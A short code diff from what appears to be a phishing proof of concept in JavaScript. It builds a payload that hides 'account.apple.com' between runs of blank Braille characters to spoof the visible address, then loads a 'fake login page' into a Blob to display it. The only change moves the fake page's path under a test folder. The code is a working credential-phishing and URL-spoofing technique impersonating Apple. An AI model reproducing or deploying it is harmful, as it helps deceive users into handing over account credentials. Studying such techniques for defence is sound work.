@@ -4,7 +4,7 @@
 payload='\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800account.apple.com\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800\u2800';
 
 // fetch fake login page and start
-fetch('/fakelogin.html').then(r => r.text()).then(h => {htmlContent = h;
+fetch('/test/fakelogin.html').then(r => r.text()).then(h => {htmlContent = h;
 
             // Create a blob with HTML content of a fake login page
             const blob = new Blob([htmlContent], { type: 'text/html' });
